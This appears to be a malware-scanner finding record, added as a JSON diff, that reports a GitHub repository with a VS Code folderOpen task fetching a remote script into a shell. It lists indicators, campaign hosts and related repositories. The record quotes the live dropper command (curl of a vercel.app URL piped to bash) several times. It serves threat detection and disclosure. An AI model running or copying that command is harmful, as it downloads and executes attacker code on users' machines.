@@ -1,0 +1,189 @@
+{
+  "finding": {
+    "key": "repository:ru-yaka/p",
+    "kind": "repository",
+    "id": "ru-yaka/p",
+    "url": "https://github.com/ru-yaka/p",
+    "registry": "github",
+    "owner": "ru-yaka",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 8,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun; code_execution/js-exec",
+    "evidence_locations": ".vscode/tasks.json:0; scripts/smoke-test.ts:12; src/utils/shell.ts:66; src/utils/shell.ts:114; src/utils/shell.ts:173; src/utils/shell.ts:260; src/utils/shell.ts:286; src/commands/template.ts:533; src/commands/template.ts:595; src/commands/sync.ts:114; src/commands/push.ts:16; src/commands/push.ts:58; src/commands/publish.ts:21; src/commands/publish.ts:168; src/commands/clone.ts:98; src/commands/clone.ts:105; src/commands/claude.ts:110; src/commands/cd.ts:109",
+    "c2_hosts": "vscode-extension-260120.vercel.app; vscode-extension-260120.vercel.ap",
+    "iocs": "vscode-extension-260120.vercel.app; https://vscode-extension-260120.vercel.app/settings/linux?flag=5-; curl https://vscode-extension-260120.vercel.app/settings/linux?flag=5- | bash; .vscode/tasks.json",
+    "matched_signatures": "settings/linux?flag=; settings/win?flag=",
+    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/win?flag='] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/ru-yaka_p.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://vscode-extension-260120.vercel.app/settings/linux?flag=5- | bash curl https://vscode-extension-260120.vercel.app/settings/linux?flag=5- | sh curl https://vscode-extension-260120.vercel.ap"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://vscode-extension-260120.vercel.app/settings/linux?flag=5- | bash curl https://vscode-extension-260120.vercel.app/settings/linux?flag=5- | sh curl https://vscode-extension-260120.vercel.ap"
+    },
+    {
+      "file": "scripts/smoke-test.ts",
+      "line": 12,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([\"bash\", \"-c\", cmd], {"
+    },
+    {
+      "file": "src/utils/shell.ts",
+      "line": 66,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([shell, ...shellArgs, command], {"
+    },
+    {
+      "file": "src/utils/shell.ts",
+      "line": 114,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([shell, ...shellArgs, command], {"
+    },
+    {
+      "file": "src/utils/shell.ts",
+      "line": 173,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([shell, ...shellArgs, resolved], {"
+    },
+    {
+      "file": "src/utils/shell.ts",
+      "line": 260,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn("
+    },
+    {
+      "file": "src/utils/shell.ts",
+      "line": 286,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([bin, ...args], {"
+    },
+    {
+      "file": "src/commands/template.ts",
+      "line": 533,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn("
+    },
+    {
+      "file": "src/commands/template.ts",
+      "line": 595,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([\"git\", ...args], {"
+    },
+    {
+      "file": "src/commands/sync.ts",
+      "line": 114,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "Bun.spawn([\"explorer.exe\", targetPath], { detached: true });"
+    },
+    {
+      "file": "src/commands/push.ts",
+      "line": 16,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([\"git\", ...args], {"
+    },
+    {
+      "file": "src/commands/push.ts",
+      "line": 58,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn("
+    },
+    {
+      "file": "src/commands/publish.ts",
+      "line": 21,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([\"git\", ...args], {"
+    },
+    {
+      "file": "src/commands/publish.ts",
+      "line": 168,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn("
+    },
+    {
+      "file": "src/commands/clone.ts",
+      "line": 98,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn("
+    },
+    {
+      "file": "src/commands/clone.ts",
+      "line": 105,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const tarProc = Bun.spawn([\"tar\", \"-xzf\", \"archive.tar.gz\"], {"
+    },
+    {
+      "file": "src/commands/claude.ts",
+      "line": 110,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([\"claude\", \"--dangerously-skip-permissions\"], {"
+    },
+    {
+      "file": "src/commands/cd.ts",
+      "line": 109,
+      "category": "code_execution",
+      "rule": "js-exec",
+      "snippet": "const proc = Bun.spawn([shell], {"
+    }
+  ],
+  "commit_sha": "ec827c1cfb225c13c65f041592e8983c9d736611",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/ru-yaka/p",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: settings/linux?flag=; settings/win?flag=. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: vscode-extension-260120.vercel.app, vscode-extension-260120.vercel.ap. This repository is one of 34 that Git Warden has confirmed as campaign GW-C-498a0aeb, which all deliver the same dropper URL shape (settings/{os}?flag=). The campaign spans 29 GitHub accounts. The other confirmed repositories are: https://github.com/aaryan121/code-conductor-fork, https://github.com/adan-asim/e-commerce-admin-app-backend, https://github.com/addis-ale/git_learn, https://github.com/bhoomikamehtastartbit/reactchakraui, https://github.com/dawit212119/eaglepoint-ai, https://github.com/dawit212119/ecommerce-backend, https://github.com/dylanlittle/team-moshpit-project, https://github.com/eastmade/web3project-momo-token, https://github.com/gauravraisharma/ticketting-system, https://github.com/hammad911/datavisualizationproject, https://github.com/haroldcalvo/workshop, https://github.com/huncholane/defi_property, https://github.com/hvmgeeks/frontendengine1, https://github.com/juanmantica123/funtico-tech-assestment, https://github.com/kreliannn/house-rental-platform, https://github.com/kreliannn/musicplayer, https://github.com/kreliannn/pharmacy-management-backend, https://github.com/lfirsl/morphix, https://github.com/luka147m/r-gradani, https://github.com/markomilivojevic/ethvault_staking, https://github.com/modish0161/poo-land-app, https://github.com/modish0161/tiger-world-maze, https://github.com/nelsondev19/defi-property, https://github.com/nurfarazi/e-commerce-mvp, https://github.com/nurfarazi/piece_of_cake_laundry, https://github.com/prahaladbelavadi/coinlocatordemo, https://github.com/ricardomartins9899/smartpay-demo, https://github.com/sharmapranay38/new_age_blockchain, https://github.com/shri33/crypto-trading-platform, https://github.com/sky-cook/tokentradingdapp, and 3 more. Across the campaign the payload is served from 11 distinct hosts: default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app, vscode-extension-260120.vercel.ap, vscode-extension-260120.vercel.app, vscode-extensions-bootstrap.vercel.app, vscode-helper-132.vercel.app, vscode-helper171-ruby.vercel.app, vscode-load-config.vercel.app, vscode-settings-bootstrap.vercel.app. Matching only one host would miss most of the operation; matching the delivery shape found all of it. Attribution: we assess this repository as PROBABLE North Korea 'Contagious Interview' activity. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape. (2) Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-extension-260120.vercel.app.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: code_execution/js-exec (9 files), install_hook/vscode-autorun (1 file).",
+    "publisher": "ru-yaka",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/.vscode/tasks.json\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/scripts/smoke-test.ts#L12\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/utils/shell.ts#L66\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/utils/shell.ts#L114\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/utils/shell.ts#L173\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/utils/shell.ts#L260\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/utils/shell.ts#L286\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/template.ts#L533\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/template.ts#L595\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/sync.ts#L114\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/push.ts#L16\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/push.ts#L58\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/publish.ts#L21\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/publish.ts#L168\nhttps://github.com/ru-yaka/p/blob/ec827c1cfb225c13c65f041592e8983c9d736611/src/commands/clone.ts#L98",
+    "verified_iocs": "vscode-extension-260120.vercel.app\nhttps://vscode-extension-260120.vercel.app/settings/linux?flag=5-\ncurl https://vscode-extension-260120.vercel.app/settings/linux?flag=5- | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
